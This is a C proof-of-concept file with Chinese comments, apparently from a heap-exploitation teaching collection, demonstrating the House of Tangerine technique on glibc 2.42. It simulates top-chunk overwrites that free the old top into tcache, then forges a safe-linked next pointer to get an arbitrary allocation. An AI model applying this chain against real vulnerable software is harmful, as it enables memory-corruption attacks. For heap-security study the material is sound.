/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_tangerine
 * 文件标注范围：2.42
 * 模拟漏洞：可覆盖 top chunk 元数据；不依赖传统 House of Force 的巨大 top。
 * 核心流程：反复让 sysmalloc 处理受损 top，把旧 top 切成可进入 tcache 的块，再 poison 其 next 实现任意分配。
 * 成功判据：malloc 返回 target；2.32 起编码 next，2.42 大 tcache/头指针变化、2.43 fastbin 移除均需不同布局。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
// x86 与 x86-64 在这些目标版本上都使用 0x10 malloc 对齐。
#define MALLOC_ALIGN 0x10L
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// sysmalloc 释放旧 top 前会扣除两个 chunk header，作为 fencepost 开销。
#define FENCEPOST (2*CHUNK_HDR_SZ)

#define PROBE (0x20-CHUNK_HDR_SZ)

// 选择物理尺寸 0x40 的 chunk 作为最终 tcache poisoning 链节点。
#define CHUNK_SIZE_1 0x40
#define SIZE_1 (CHUNK_SIZE_1-CHUNK_HDR_SZ)

// 这一页内跨度也可拆成多次较小申请；单次大申请只是让堆布局更直观。
#define CHUNK_SIZE_3 (PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
#define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)

/**
 * 上游曾在 glibc 2.34 与 2.39 的 x86-64、x86、AArch64 环境测试该布局。
 *
 * House of Tangerine 是 House of Orange 的现代化分支：它保留破坏 top 的思想，
 * 但把旧 top 经 sysmalloc 内部 _int_free 送入 tcache，全程无需显式调用 free。
 *
 * sysmalloc 对无法合并的旧 top（wilderness）执行 _int_free，源码参考：
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * 最终通过 tcache poisoning 让 malloc 返回一个满足 MALLOC_ALIGNMENT 的任意指针；
 * glibc 2.32 起 next 采用 safe-linking 编码，所以对应版本还需要堆地址泄漏。
 *
 * 漏洞模型可以是同时具备正、负方向的越界写，例如负向 BOF 加正向 OOB；
 * 也可以是在编辑前一块时单独向高地址溢出，连续覆盖后续 top 元数据。
 *
 * 核心链需要 5 次 malloc 与 3 次越界写；为稳定探测 top size 的版本会多一次 malloc。
 *
 * 教学 PoC 先申请探针读取当前 top size，避免依赖启动时的细微堆余量；
 * 真题若能根据固定布局预测该值，就能删除探针并恢复为 5 次申请。
 *
 * 特别感谢 pepsipu 设计 PicoCTF 2024 题目 “High Frequency Troubles”；
 * 该题启发了本技术对“无 free 堆破坏”场景的系统化整理。
 */
int main() {
  size_t size_2, *top_size_ptr, top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
  long win[2] __attribute__ ((aligned (0x10)));
  // 关闭三个标准流的缓冲，避免 stdio 隐式 malloc 干扰 top 与 tcache 布局。
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // 所有物理 chunk size 必须满足 MALLOC_ALIGNMENT；先用断言排除常量计算错误。
  assert((CHUNK_SIZE_1 & MALLOC_MASK) == CHUNK_SIZE_1);
  assert((CHUNK_SIZE_3 & MALLOC_MASK) == CHUNK_SIZE_3);

  // 任意分配目标必须 0x10 对齐，否则 tcache_get 的 aligned_OK 检查会中止。
  // glibc 2.42 的目标块校验补丁要求伪 tcache 目标同时具备可接受的 size，参考链接如下： https://patchwork.sourceware.org/project/glibc/patch/20250206213709.2394624-2-benjamin.p.kallus.gr@dartmouth.edu/
  // 因此使用 0x10 对齐的数组，并在目标用户指针前对应位置布置非零合法 size。
  target = (size_t) &win[0];
  win[1] = 0x41;

  // 先用一个最小探针块读取当前 top size，使 PoC 不依赖进程初始堆余量；
  // 真题若能从固定布局预测 top size，可省去这次 malloc，把总请求数减一。
  heap_ptr = malloc(PROBE);
  top_size = heap_ptr[(PROBE / SIZE_SZ) + 1];

  // 反算第一阶段申请 size_2，使截短后的旧 top 扣除 fencepost 后恰好为 CHUNK_SIZE_1。

  size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
  size_2 &= PAGE_MASK;
  size_2 &= MALLOC_MASK;

  // 第一次关键申请把用户区末端推进到紧邻 top header 的位置。
  heap_ptr = malloc(size_2);

  // 漏洞模拟：用负向越界、正向 OOB 或前一块溢出定位并覆盖 top->size。
  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];

  top_size = *top_size_ptr;

  // 保留原 top size 的页内低位，使伪造后的 top 逻辑末端仍满足页对齐检查；常见结果为 0x1000。
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;

  // 按 sysmalloc 源码扣除两个 fencepost header，计算即将交给 _int_free 的旧 top 尺寸。
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  assert(freed_top_size == CHUNK_SIZE_1);

  /*
   * 请求大于伪造后可用 top 的 SIZE_3，迫使 malloc 进入 sysmalloc。由于我们
   * 把 old_size 截短，旧 top 的逻辑末端无法与新 brk 区域连续合并，sysmalloc
   * 会在建立 fencepost 后调用 _int_free 释放旧 top。保留 PAGE_MASK 对应的
   * 页内位可通过 old_top 末端对齐检查。源码参考：
   * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
   */

  heap_ptr = malloc(SIZE_3);

  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];

  // 第二轮 top 覆盖同样保留页内低位，使伪 top 末端页对齐；常见截短值仍为 0x1000。
  new_top_size = top_size & PAGE_MASK;
  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;

  // 再次扣除 fencepost 开销，确认即将间接释放的旧 top 仍为 CHUNK_SIZE_1。
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;

  assert(freed_top_size == CHUNK_SIZE_1);

  // 再次请求 SIZE_3，触发 sysmalloc 间接释放上一个截短 top，全程没有显式 free。
  heap_ptr = malloc(SIZE_3);

  // 被 sysmalloc 间接释放的旧 top 用户区就是 vuln_tcache；保存其 next 字段地址。
  vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];

  // 再重复一次截短 top 与 sysmalloc 间接释放，凑出额外 free chunk，供 smallbin 向 tcache 搬运。
  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
  new_top_size = top_size & PAGE_MASK;
  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
  heap_ptr = malloc(SIZE_3); // 这次大于伪 top 的请求触发第二次内部 _int_free。
  void *pad1 = malloc(0x10000); // 大请求触发 consolidate，把最新 fastbin chunk 归并并整理到 smallbin。
  void *pad2 = malloc(SIZE_1); // 从 smallbin 取一块时，把其余同尺寸块按 2.42 规则搬入 tcache。

  // 漏洞写原语：覆盖已释放 vuln_tcache 的 next，使 tcache 链后继指向任意目标。
  // glibc 2.32 起按 storage>>12 编码 next；用已泄漏的 vuln_tcache 地址计算 safe-linking 密文。
  heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);

  // 第一次同尺寸 malloc 取走真实 vuln_tcache，并把伪造后继安装为 tcache 头。
  heap_ptr = malloc(SIZE_1);

  // 第二次同尺寸 malloc 应返回任意目标，从而得到对目标的读写指针。
  heap_ptr = malloc(SIZE_1);

  // 严格比较返回地址与 target；相等才证明无 free 的 top->tcache 任意分配链成功。
  assert((size_t) heap_ptr == target);
}
